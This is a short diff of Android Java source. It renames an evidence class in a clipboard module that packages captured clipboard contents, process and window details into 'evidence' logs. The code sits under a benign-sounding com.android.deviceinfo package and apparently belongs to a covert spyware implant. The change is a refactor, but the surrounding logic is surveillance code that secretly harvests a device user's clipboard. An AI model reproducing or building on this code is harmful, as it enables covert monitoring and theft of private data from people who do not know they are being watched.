@@ -19,7 +19,7 @@ import android.text.ClipboardManager;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.gui.AGUI;
 import com.android.deviceinfo.interfaces.IncrementalLog;
@@ -107,17 +107,17 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 		final byte[] window = WChar.getBytes("", true); //$NON-NLS-1$
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
 		
-		EvidenceReference logIncremental;
+		EvidenceBuilder logIncremental;
 		
 		synchronized (this) {
-			logIncremental = new EvidenceReference(EvidenceType.CLIPBOARD);
+			logIncremental = new EvidenceBuilder(EvidenceType.CLIPBOARD);
 		}
 		
 		items.add(tm);
 		items.add(process);
 		items.add(window);
 		items.add(payload);
-		items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
+		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
